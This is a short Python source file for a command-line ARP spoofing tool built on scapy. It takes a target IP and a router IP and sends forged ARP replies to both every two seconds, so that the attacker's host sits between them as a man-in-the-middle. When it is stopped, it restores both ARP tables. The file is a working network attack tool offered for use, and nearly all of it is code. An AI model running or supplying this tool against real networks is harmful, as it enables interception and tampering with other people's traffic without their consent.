#!usr/bin/env python 

# ARP_Spoofer Python Tool Version 1.0
# Developed By Mostafa_Samy
# Github Link ==>> https://github.com/Mostafa-Samy-97

'''
Steps :
1- Receive Target IP and MAC Address from the user 
2- Receive Router IP and MAC Address from the user  
3- Send ARP Response to the Target Device tell it iam the Router Gateway 
4- Send ARP Response to the Router Device tell it iam the Target Device
5- Restore ARP Table for Target and Router
'''

import scapy.all as scapy
from getmac import get_mac_address
import sys
import time
    
# Receive Target IP 
Target_IP = raw_input('\nEnter Target IP > ')
# Get Target MAC Address
Target_MAC = get_mac_address(Target_IP)
# Receieve Router IP 
Router_IP = raw_input('\nEnter Router IP > ')
# Get Router MAC Address 
Router_MAC = get_mac_address(Router_IP)

# op 2 => means that it's ARP response not a Request | 1 => request , 2 => response
# pdst => Destination IP | hwdst => Desktination MAC Address
# psrc => Source IP | hwsrc => Source MAC Address

# Prepare ARP Response Packet before Send it to Target Device and store that in a variable
Target_packet = scapy.ARP(op=2, pdst=Target_IP, hwdst=Target_MAC, psrc=Router_IP)

# Prepare ARP Response Packet to send it to Router Device and store that in a variable
Router_packet = scapy.ARP(op=2, pdst=Router_IP, hwdst=Router_MAC, psrc=Target_IP)

# Prepare Restore ARP Table Packets to default for Target Device 
Restore_Target_Packet = scapy.ARP(op=2, pdst=Target_IP, hwdst=Target_MAC, psrc=Router_IP, hwsrc=Router_MAC)

# Prepare Restore ARP Table Packets to default for Router Device 
Restore_Router_Packet = scapy.ARP(op=2, pdst=Router_IP, hwdst=Router_MAC, psrc=Target_IP, hwsrc=Target_MAC)

# Create Packets Counter to user 
send_packets_count = 0

# Send ARP Response Packet to Target and Router Devices
try :
    while True :
        # Sending ARP Spoofing Response to Target        
        scapy.send(Target_packet, verbose=False)
        # Sending ARP Spoofing Response to Router
        scapy.send(Router_packet, verbose=False)
        # Packets Counter Increment
        send_packets_count = send_packets_count + 2
        # Print Dynamic Sending of ARP Packets
        print('\n')
        print('\r[+] Sending ARP Packets ' + str(send_packets_count) + ' ...'),
        sys.stdout.flush()
        # Delay 2 seconds and resend ARP Packets again
        time.sleep(2)
except KeyboardInterrupt :
    scapy.send(Restore_Router_Packet, verbose=False)
    scapy.send(Restore_Target_Packet, verbose=False)
    print('\n[-] Restoring ARP Table for Target and Router ...')
